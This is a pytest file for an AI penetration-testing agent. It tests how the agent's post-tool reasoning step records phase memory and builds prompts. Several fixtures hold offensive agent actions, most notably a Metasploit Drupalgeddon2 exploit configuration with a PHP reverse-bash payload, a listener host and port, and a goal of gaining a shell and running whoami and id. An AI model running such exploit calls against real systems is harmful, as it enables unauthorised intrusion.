"""Tests for PTR prompt context injection.

Purpose
-------
Validates that ``post_tool_reasoning/node.py`` stamps current-turn
iteration-memory context onto the PTR prompt at call time via the
runtime-owned helpers ``peek_next_phase_sequence`` and
``latest_recorded_phase_sequence``. Specifically:

- the PTR node reads ``turn_sequence`` from runtime metadata only,
- it *peeks* the next phase (does not reserve/mutate the counter),
- it computes the latest already-recorded phase for the active turn,
- it passes all three values into ``PostToolReasoningPromptBuilder
  .build_user_prompt``,
- when ``turn_sequence`` is missing or non-int, all three values
  degrade to ``None`` so the builder omits the execution-context
  section cleanly (mirroring the degradation contract shared with
  the recorder and the tool-result projection).

Scope
-----
Covers only the prompt-build-time stamping in
``_resolve_iteration_memory_prompt_context``. Recorder/ledger append
semantics are covered by ``test_iteration_memory_continuity.py``;
helper ordering/rendering is covered by
``agent/graph/utils/tests/test_iteration_memory.py``; prompt-section
inclusion/omission is covered by
``core/prompts/tests/test_builders.py``.
"""

from __future__ import annotations

from typing import Any, Dict

import pytest

from agent.graph.memory.findings import select_relevant_findings_for_prompt
from agent.graph.memory.target_resolution import resolve_target_from_working_memory
from agent.graph.nodes.post_tool_reasoning.node import (
    _build_relevant_findings_for_prompt,
    _resolve_iteration_memory_prompt_context,
)
from agent.graph.nodes.post_tool_reasoning import node
from agent.graph.nodes.post_tool_reasoning.models import (
    PostToolReasoningDecisionOutput,
    PostToolReasoningOutput,
)
from agent.graph.nodes.post_tool_reasoning.recorders import record_observation
from agent.graph.state import FactsState, InteractiveState, TraceState
from agent.graph.utils import iteration_memory as _iteration_memory
from agent.graph.utils.iteration_memory import (
    get_current_turn_scope,
    get_ledger,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def _make_state(metadata: Dict[str, Any] | None = None) -> InteractiveState:
    facts = FactsState(
        task_id=1,
        message="scan target",
        capability="deep_reasoning",
        conversation_id="conv-1",
        metadata=metadata if metadata is not None else {},
    )
    return InteractiveState(facts=facts, trace=TraceState())


def _working_memory(metadata: Dict[str, Any]) -> Dict[str, Any]:
    raw = metadata.get("working_memory")
    if isinstance(raw, dict):
        return raw
    return {}


def _counter(metadata: Dict[str, Any]) -> int | None:
    value = _working_memory(metadata).get("current_turn_phase_counter")
    return value if isinstance(value, int) else None


def _make_output(
    *,
    observation: str = (
        "Bounded probe returned filtered state for the port of interest. "
        "This PTR step records the result into ledger for continuity."
    ),
    next_action: str = "think_more",
    action_reasoning: str = "reason for step",
) -> PostToolReasoningOutput:
    return PostToolReasoningOutput(
        observation=observation,
        next_action=next_action,  # type: ignore[arg-type]
        action_reasoning=action_reasoning,
    )


# ---------------------------------------------------------------------------
# Happy-path stamping
# ---------------------------------------------------------------------------


class TestResolveIterationMemoryPromptContext:
    """The helper stamps context correctly when turn_sequence is present."""

    def test_empty_ledger_empty_counter_returns_zero_and_none(self) -> None:
        metadata: Dict[str, Any] = {"turn_sequence": 12}

        (
            turn_sequence,
            current_phase,
            latest_phase,
        ) = _resolve_iteration_memory_prompt_context(metadata)

        assert turn_sequence == 12
        # First PTR step of the turn is about to create phase 0.
        assert current_phase == 0
        # Ledger is empty so there is nothing already recorded.
        assert latest_phase is None

    def test_after_one_ptr_append_next_peek_advances(self) -> None:
        state = _make_state({"turn_sequence": 12})
        record_observation(
            state,
            _make_output(
                next_action="think_more",
                action_reasoning="Need one more reasoning step.",
            ),
        )
        metadata = state.facts.metadata

        (
            turn_sequence,
            current_phase,
            latest_phase,
        ) = _resolve_iteration_memory_prompt_context(metadata)

        assert turn_sequence == 12
        # Recorder reserved phase 0 and advanced the counter to 1, so the
        # NEXT PTR step is about to create phase 1.
        assert current_phase == 1
        # Phase 0 is now the most recent recorded phase.
        assert latest_phase == 0

    def test_peek_is_non_mutating(self) -> None:
        """Prompt-build time must never touch the ledger counter or ledger list."""
        state = _make_state({"turn_sequence": 5})
        record_observation(
            state,
            _make_output(
                next_action="think_more",
                action_reasoning="Need one more reasoning step.",
            ),
        )
        metadata = state.facts.metadata

        before_counter = _counter(metadata)
        before_ledger = list(get_ledger(metadata))
        before_turn_key = get_current_turn_scope(metadata)

        # Call the resolver many times; no peek call must advance state.
        for _ in range(5):
            _resolve_iteration_memory_prompt_context(metadata)

        assert _counter(metadata) == before_counter
        assert list(get_ledger(metadata)) == before_ledger
        assert get_current_turn_scope(metadata) == before_turn_key

    def test_latest_phase_uses_only_active_turn_records(self) -> None:
        """Prior-turn records in the ledger must not leak into latest_phase."""
        metadata: Dict[str, Any] = {"turn_sequence": 12}
        # Simulate a stray prior-turn record (e.g. test scaffolding leakage).
        _iteration_memory.append(
            metadata,
            turn_sequence=11,
            source="ptr",
            payload={
                "sections": [
                    {
                        "heading": "PTR Decision",
                        "body": "next_action: prior_turn_leftover",
                    }
                ]
            },
            phase_sequence=7,
        )
        # Advance counter fresh for the active turn: peek expectation uses
        # turn_sequence==12 so counter state from turn 11 is irrelevant.
        _, current_phase, latest_phase = (
            _resolve_iteration_memory_prompt_context(metadata)
        )

        # Counter has never been touched for turn 12, so the peek falls
        # through to 0 and latest recorded for turn 12 is None.
        assert current_phase == 0
        assert latest_phase is None


# ---------------------------------------------------------------------------
# Degradation contract: missing / non-int turn_sequence
# ---------------------------------------------------------------------------


class TestResolveIterationMemoryPromptContextDegradation:
    """When turn_sequence is absent or non-int, all three values are None."""

    def test_missing_turn_sequence_returns_all_none(self) -> None:
        metadata: Dict[str, Any] = {}

        result = _resolve_iteration_memory_prompt_context(metadata)

        assert result == (None, None, None)

    def test_non_int_turn_sequence_returns_all_none(self) -> None:
        metadata: Dict[str, Any] = {"turn_sequence": "not-an-int"}

        result = _resolve_iteration_memory_prompt_context(metadata)

        assert result == (None, None, None)

    def test_none_turn_sequence_returns_all_none(self) -> None:
        metadata: Dict[str, Any] = {"turn_sequence": None}

        result = _resolve_iteration_memory_prompt_context(metadata)

        assert result == (None, None, None)


# ---------------------------------------------------------------------------
# Integration-level: stable ordering across PTR -> (tool) -> PTR
# ---------------------------------------------------------------------------


class TestStableOrderingAcrossIterations:
    """Demonstrates peek reflects advances done by the recorder over time."""

    def test_peek_advances_after_each_recorder_append(self) -> None:
        state = _make_state({"turn_sequence": 42})
        metadata = state.facts.metadata

        # Iteration 1: empty ledger, PTR is about to create phase 0.
        _, current_0, latest_0 = _resolve_iteration_memory_prompt_context(metadata)
        assert (current_0, latest_0) == (0, None)

        record_observation(
            state,
            _make_output(
                next_action="think_more",
                action_reasoning="PTR pass one requests more reasoning.",
            ),
        )

        # Iteration 2: after one PTR append, next is 1, latest is 0.
        _, current_1, latest_1 = _resolve_iteration_memory_prompt_context(metadata)
        assert (current_1, latest_1) == (1, 0)

        # Simulate a tool-phase append interleaving between PTR passes.
        _iteration_memory.append(
            metadata,
            turn_sequence=42,
            source="tool",
            payload={
                "sections": [
                    {
                        "heading": "Tool Output Summary",
                        "body": "port 21 filtered",
                    }
                ]
            },
        )

        # Iteration 3: tool append used phase 1 -> next is 2, latest is 1.
        _, current_2, latest_2 = _resolve_iteration_memory_prompt_context(metadata)
        assert (current_2, latest_2) == (2, 1)

        record_observation(
            state,
            _make_output(
                next_action="think_more",
                action_reasoning="PTR pass two requests more reasoning.",
            ),
        )

        # Iteration 4: PTR append used phase 2 -> next is 3, latest is 2.
        _, current_3, latest_3 = _resolve_iteration_memory_prompt_context(metadata)
        assert (current_3, latest_3) == (3, 2)

        # Ledger order matches the append order (PTR, tool, PTR) with
        # monotonically increasing phase_sequence values for the turn.
        ledger = get_ledger(metadata)
        assert [(r["source"], r["phase_sequence"]) for r in ledger] == [
            ("ptr", 0),
            ("tool", 1),
            ("ptr", 2),
        ]


# ---------------------------------------------------------------------------
# Prompt builder integration smoke
# ---------------------------------------------------------------------------


class TestPromptReceivesContext:
    """The values stamped by the node are consumed by the prompt builder."""

    @pytest.mark.asyncio
    async def test_live_node_builds_decision_prompt_with_phase_context(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        metadata: Dict[str, Any] = {
            "turn_sequence": 4,
            "api_key": "test-api-key",
            "model": "test-model",
            "synthesized_output": {
                "tool": "nmap",
                "summary": "Current tool confirmed port 80 is open.",
                "key_findings": ["80/tcp open http"],
            },
        }
        _iteration_memory.append(
            metadata,
            turn_sequence=3,
            source="tool",
            payload={
                "sections": [
                    {
                        "heading": "Prior Turn Tool",
                        "body": "This phase must not render in turn 4.",
                    }
                ]
            },
            phase_sequence=9,
        )
        _iteration_memory.append(
            metadata,
            turn_sequence=4,
            source="tool",
            payload={
                "sections": [
                    {
                        "heading": "Active Turn Tool",
                        "body": "This phase must render in turn 4.",
                    }
                ]
            },
        )
        state = _make_state(metadata)
        state.facts.selected_tool = "nmap"
        state.facts.current_goal = "Assess exposed services."
        state.trace.history = [
            {"role": "user", "content": "FORBIDDEN_PRIOR_TRANSCRIPT_USER"},
            {"role": "assistant", "content": "FORBIDDEN_PRIOR_TRANSCRIPT_ASSISTANT"},
        ]

        captured: Dict[str, str] = {}

        async def fake_analyze_tool_result(**kwargs: Any) -> PostToolReasoningDecisionOutput:
            captured["decision_prompt"] = kwargs["user_prompt"]
            return PostToolReasoningDecisionOutput(
                next_action="finalize",
                action_reasoning="The current tool output is enough to answer.",
                user_goal_achieved=True,
            )

        async def fake_generate_observation_text(*_args: Any, **_kwargs: Any) -> str:
            return "Observed enough evidence to finalize."

        monkeypatch.setattr(node, "resolve_llm_client", lambda *_args, **_kwargs: object())
        monkeypatch.setattr(node, "resolve_llm_call_settings", lambda *_args, **_kwargs: {})
        monkeypatch.setattr(node, "get_llm_reasoning_effort", lambda *_args, **_kwargs: None)
        monkeypatch.setattr(node, "analyze_tool_result", fake_analyze_tool_result)
        monkeypatch.setattr(node, "_generate_observation_text", fake_generate_observation_text)

        await node.post_tool_reasoning(state, context=None, config=None, writer=None)

        prompt = captured["decision_prompt"]
        assert "## Current Execution Context" in prompt
        assert "turn_sequence: 4" in prompt
        assert "current_phase_sequence: 1" in prompt
        assert "latest_recorded_phase_sequence: 0" in prompt
        assert "<phase turn=4 phase=0 source=tool>" in prompt
        assert "This phase must render in turn 4." in prompt
        assert "This phase must not render in turn 4." not in prompt
        assert "## Conversation History" not in prompt
        assert "FORBIDDEN_PRIOR_TRANSCRIPT_USER" not in prompt
        assert "FORBIDDEN_PRIOR_TRANSCRIPT_ASSISTANT" not in prompt

    def test_prompt_renders_execution_context_from_node_values(self) -> None:
        from core.prompts.builders.post_tool import PostToolReasoningPromptBuilder

        state = _make_state({"turn_sequence": 9})
        # Seed the ledger so latest_recorded is meaningful.
        record_observation(
            state,
            _make_output(
                next_action="think_more",
                action_reasoning="Seed PTR phase for prompt context.",
            ),
        )
        metadata = state.facts.metadata

        (
            turn_sequence,
            current_phase,
            latest_phase,
        ) = _resolve_iteration_memory_prompt_context(metadata)

        builder = PostToolReasoningPromptBuilder()
        prompt = builder.build_user_prompt(
            interactive=state,
            synthesized={"tool": "nmap", "summary": "", "key_findings": []},
            failure_context={
                "failure_detected": False,
                "failure_category": None,
                "retry_count": 0,
                "can_retry": True,
                "max_retries": 2,
            },
            environment_context="",
            turn_sequence=turn_sequence,
            current_ptr_phase_sequence=current_phase,
            latest_recorded_phase_sequence=latest_phase,
        )

        assert "## Current Execution Context" in prompt
        assert "turn_sequence: 9" in prompt
        assert "current_phase_sequence: 1" in prompt
        assert "latest_recorded_phase_sequence: 0" in prompt

    def test_prompt_renders_operational_capability_surface(self) -> None:
        from core.prompts.builders.post_tool import PostToolReasoningPromptBuilder

        state = _make_state({"turn_sequence": 10})
        builder = PostToolReasoningPromptBuilder()
        prompt = builder.build_user_prompt(
            interactive=state,
            synthesized={"tool": "nmap", "summary": "", "key_findings": []},
            failure_context={
                "failure_detected": False,
                "failure_category": None,
                "retry_count": 0,
                "can_retry": True,
                "max_retries": 2,
            },
            environment_context="",
            capability_surface=(
                "- exploitation_framework: Use exploit frameworks. Visible tools: exploitation_tools.metasploit.run_exploit"
            ),
            turn_sequence=10,
            current_ptr_phase_sequence=0,
            latest_recorded_phase_sequence=None,
        )

        assert "## Agent Operational Capability Surface" in prompt
        assert "exploitation_framework" in prompt
        assert "exploitation_tools.metasploit.run_exploit" in prompt

    def test_prompt_omits_execution_context_when_turn_missing(self) -> None:
        from core.prompts.builders.post_tool import PostToolReasoningPromptBuilder

        state = _make_state({})  # no turn_sequence in metadata
        metadata = state.facts.metadata

        (
            turn_sequence,
            current_phase,
            latest_phase,
        ) = _resolve_iteration_memory_prompt_context(metadata)
        assert (turn_sequence, current_phase, latest_phase) == (None, None, None)

        builder = PostToolReasoningPromptBuilder()
        prompt = builder.build_user_prompt(
            interactive=state,
            synthesized={"tool": "nmap", "summary": "", "key_findings": []},
            failure_context={
                "failure_detected": False,
                "failure_category": None,
                "retry_count": 0,
                "can_retry": True,
                "max_retries": 2,
            },
            environment_context="",
            turn_sequence=turn_sequence,
            current_ptr_phase_sequence=current_phase,
            latest_recorded_phase_sequence=latest_phase,
        )

        assert "## Current Execution Context" not in prompt

    def test_prompt_renders_think_more_and_reflect_phase_memory_rows(self) -> None:
        from core.prompts.builders.post_tool import PostToolReasoningPromptBuilder

        state = _make_state({"turn_sequence": 15})
        metadata = state.facts.metadata
        _iteration_memory.append(
            metadata,
            turn_sequence=15,
            source="think_more",
            payload={
                "sections": [
                    {
                        "heading": "Action Reasoning",
                        "body": "Refined hypothesis before next tool step.",
                    }
                ]
            },
        )
        _iteration_memory.append(
            metadata,
            turn_sequence=15,
            source="reflect",
            payload={
                "sections": [
                    {
                        "heading": "Reflection",
                        "body": "Adjusted strategy after repeated no-progress.",
                    }
                ]
            },
        )

        (
            turn_sequence,
            current_phase,
            latest_phase,
        ) = _resolve_iteration_memory_prompt_context(metadata)

        builder = PostToolReasoningPromptBuilder()
        prompt = builder.build_user_prompt(
            interactive=state,
            synthesized={"tool": "nmap", "summary": "", "key_findings": []},
            failure_context={
                "failure_detected": False,
                "failure_category": None,
                "retry_count": 0,
                "can_retry": True,
                "max_retries": 2,
            },
            environment_context="",
            turn_sequence=turn_sequence,
            current_ptr_phase_sequence=current_phase,
            latest_recorded_phase_sequence=latest_phase,
        )

        assert "## Prior Current-Turn Phase Memory" in prompt
        assert "source=think_more" in prompt
        assert "source=reflect" in prompt

    def test_prompt_characterizes_metasploit_loop_phase_blocks_before_current_tool_tail(
        self,
    ) -> None:
        from core.prompts.builders.post_tool import PostToolReasoningPromptBuilder

        tool_parameters = {
            "target": "cve-2018-7600-web-1:80",
            "timeout": 600,
            "module_path": "exploit/unix/webapp/drupal_drupalgeddon2",
            "rhosts": "cve-2018-7600-web-1",
            "rport": 80,
            "lhost": "172.17.0.2",
            "lport": 4444,
            "payload": "php/unix/cmd/reverse_bash",
            "target_index": 8,
            "custom_options": {
                "TARGETURI": "/",
                "SSL": "false",
                "AutoCheck": "false",
                "ForceExploit": "true",
            },
        }
        repeated_attempt_summary = (
            "Third retry repeated the same Drupalgeddon2 module and payload. "
            "Handler started but no session created again."
        )
        metadata: Dict[str, Any] = {
            "turn_sequence": 3,
            "last_tool_result": {
                "parameters": tool_parameters,
                "stdout_excerpt": "",
                "stderr_excerpt": "",
                "was_truncated": False,
                "chars_truncated": 0,
                "suggest_file_reading": False,
            },
            "last_tool_result_compact": {
                "summary": repeated_attempt_summary,
                "key_findings": [
                    "Payload remained php/unix/cmd/reverse_bash.",
                    "TARGET index remained 8.",
                    "No session opened on the repeated retry.",
                ],
                "errors": [],
            },
            "working_memory": {
                "current_turn_phase_turn": 3,
                "current_turn_phase_counter": 3,
                "current_turn_phases": [
                    {
                        "turn_sequence": 3,
                        "phase_sequence": 0,
                        "source": "tool",
                        "sections": [
                            {
                                "heading": "Tool Executed",
                                "body": (
                                    "Tool: exploitation_tools.metasploit.run_exploit\n"
                                    "Parameters: target=cve-2018-7600-web-1:80, "
                                    "timeout=600, module_path=exploit/unix/webapp/"
                                    "drupal_drupalgeddon2, rhosts=cve-2018-7600-web-1, "
                                    "rport=80, lhost=172.17.0.2, lport=4444, "
                                    "payload=php/unix/cmd/reverse_bash, target_index=8"
                                ),
                            },
                            {
                                "heading": "Tool Output Summary",
                                "body": (
                                    "First attempt used Drupalgeddon2 with the PHP reverse "
                                    "shell payload. Handler started but no session created."
                                ),
                            },
                        ],
                        "kind": "exploitation_tools.metasploit.run_exploit",
                        "status": "completed",
                        "summary": "Handler started but no session created.",
                    },
                    {
                        "turn_sequence": 3,
                        "phase_sequence": 1,
                        "source": "ptr",
                        "sections": [
                            {
                                "heading": "PTR Decision",
                                "body": (
                                    "next_action: call_tool\n"
                                    "user_goal_achieved: false\n"
                                    "failure_detected: true\n"
                                    "failure_category: invalid_params\n"
                                    "retry_suggested: true"
                                ),
                            },
                            {
                                "heading": "Action Reasoning",
                                "body": (
                                    "User goal is not achieved because no session and no "
                                    "command outputs were captured. A corrective re-run is "
                                    "required."
                                ),
                            },
                            {
                                "heading": "Tool Intent",
                                "body": (
                                    "description: Corrective re-run of Drupalgeddon2 with "
                                    "TARGET=8 and payload php/unix/cmd/reverse_bash.\n"
                                    "target: cve-2018-7600-web-1:80 (TARGETURI=/)\n"
                                    "focus: metasploit drupalgeddon2; obtain session and evidence"
                                ),
                            },
                            {
                                "heading": "Effective Next Goal",
                                "body": (
                                    "Obtain a fresh session via Drupalgeddon2 with TARGET 8 "
                                    "and php/unix/cmd/reverse_bash, then capture raw outputs "
                                    "for whoami, id, uname -a, and pwd."
                                ),
                            },
                        ],
                        "kind": "reasoning_step",
                        "action": "call_tool",
                        "failure_category": "invalid_params",
                        "summary": "PTR requested a corrective re-run.",
                    },
                    {
                        "turn_sequence": 3,
                        "phase_sequence": 2,
                        "source": "tool",
                        "sections": [
                            {
                                "heading": "Tool Executed",
                                "body": (
                                    "Tool: exploitation_tools.metasploit.run_exploit\n"
                                    "Parameters: target=cve-2018-7600-web-1:80, "
                                    "timeout=600, module_path=exploit/unix/webapp/"
                                    "drupal_drupalgeddon2, rhosts=cve-2018-7600-web-1, "
                                    "rport=80, lhost=172.17.0.2, lport=4444, "
                                    "payload=php/unix/cmd/reverse_bash, target_index=8"
                                ),
                            },
                            {
                                "heading": "Tool Output Summary",
                                "body": (
                                    "Second retry reused the same module, target, and payload. "
                                    "Handler started but no session created."
                                ),
                            },
                        ],
                        "kind": "exploitation_tools.metasploit.run_exploit",
                        "status": "completed",
                        "summary": "Handler started but no session created on retry.",
                    },
                ],
            },
        }
        state = _make_state(metadata)
        state.facts.current_goal = "Gain a shell on the Drupal target and capture evidence."
        state.facts.selected_tool = "exploitation_tools.metasploit.run_exploit"
        state.facts.tool_parameters = tool_parameters

        (
            turn_sequence,
            current_phase,
            latest_phase,
        ) = _resolve_iteration_memory_prompt_context(metadata)

        builder = PostToolReasoningPromptBuilder()
        prompt = builder.build_user_prompt(
            interactive=state,
            synthesized={
                "tool": "exploitation_tools.metasploit.run_exploit",
                "summary": repeated_attempt_summary,
                "key_findings": [
                    "Repeated exploit attempt preserved payload and target index.",
                    "No session was created on the latest retry.",
                ],
            },
            failure_context={
                "failure_detected": True,
                "failure_category": "invalid_params",
                "retry_count": 2,
                "can_retry": True,
                "max_retries": 3,
            },
            environment_context="",
            turn_sequence=turn_sequence,
            current_ptr_phase_sequence=current_phase,
            latest_recorded_phase_sequence=latest_phase,
        )

        phase_0 = "<phase turn=3 phase=0 source=tool>"
        phase_1 = "<phase turn=3 phase=1 source=ptr>"
        phase_2 = "<phase turn=3 phase=2 source=tool>"
        assert prompt.index(phase_0) < prompt.index(phase_1) < prompt.index(phase_2)
        assert prompt.count("module_path=exploit/unix/webapp/drupal_drupalgeddon2") >= 3
        assert prompt.count("payload=php/unix/cmd/reverse_bash") >= 3
        assert prompt.count("target=cve-2018-7600-web-1:80") >= 3
        assert prompt.count("target_index=8") >= 3
        assert "## Action Reasoning" in prompt
        assert (
            "User goal is not achieved because no session and no command outputs "
            "were captured. A corrective re-run is required."
        ) in prompt
        assert "## Tool Intent" in prompt
        assert "## Effective Next Goal" in prompt
        assert (
            "Obtain a fresh session via Drupalgeddon2 with TARGET 8 and "
            "php/unix/cmd/reverse_bash"
        ) in prompt
        assert "Retry attempts: 2 of 3" in prompt
        system_prompt = builder.build_system_prompt()
        assert 'next_action: "reflect"' in system_prompt
        assert 'next_action: "finalize"' in system_prompt
        assert "`unavailable_capability`" in system_prompt
        assert "no available tool or reasonable substitute" in system_prompt
        assert "Do not ask for the same capability again" in system_prompt
        assert prompt.index(phase_2) < prompt.index(
            f"## Tool Output Summary\n{repeated_attempt_summary}"
        )
        assert "[turn=3 phase=0 source=tool]" not in prompt
        assert (
            "kind=exploitation_tools.metasploit.run_exploit; "
            "status=completed; summary=Handler started but no session created."
        ) not in prompt


class TestRelevantFindingsParity:
    """PTR findings call site stays equivalent to helper composition."""

    def test_relevant_findings_helper_matches_ptr_behavior(self) -> None:
        state = _make_state(
            {
                "next_tool_hint": "check http endpoints",
                "tool_intent": {"focus": "http"},
                "last_tool_result": {
                    "parameters": {"target": "10.0.0.1", "ports": "80,443"},
                },
                "working_memory": {
                    "active": {"target_id": "target:intent:target"},
                    "referents": {"intent:target": {"value": "10.0.0.1"}},
                    "available_findings": [
                        {
                            "kind": "service_detected",
                            "target": "10.0.0.1",
                            "subject": "10.0.0.1:80/tcp",
                            "details": {"service": "http", "product": "nginx"},
                            "assertion_level": "observed",
                            "confidence": 1.0,
                            "seen_at": 1_713_870_000,
                            "ttl_seconds": 9_999_999_999,
                        },
                        {
                            "kind": "port_open",
                            "target": "10.0.0.9",
                            "subject": "10.0.0.9:22/tcp",
                            "details": {},
                            "assertion_level": "observed",
                            "confidence": 1.0,
                            "seen_at": 1_713_870_000,
                            "ttl_seconds": 9_999_999_999,
                        },
                    ],
                },
            }
        )
        state.facts.current_goal = "Enumerate HTTP service"
        state.facts.selected_tool = "information_gathering.network_discovery.nmap"

        actual = _build_relevant_findings_for_prompt(state)

        working_memory = state.facts.metadata["working_memory"]
        resolved_target = resolve_target_from_working_memory(
            dict(working_memory),
            intent_referent_key="intent:target",
            recent_turn_limit=4,
        )
        expected = select_relevant_findings_for_prompt(
            available_findings=working_memory["available_findings"],
            target=resolved_target,
            subject_hint_components=(
                state.facts.current_goal,
                state.facts.metadata.get("next_tool_hint"),
                state.facts.metadata["last_tool_result"]["parameters"],
                state.facts.metadata["tool_intent"]["focus"],
            ),
            limit=8,
        )

        assert actual == expected


if __name__ == "__main__":  # pragma: no cover - manual run convenience
    pytest.main([__file__, "-v"])
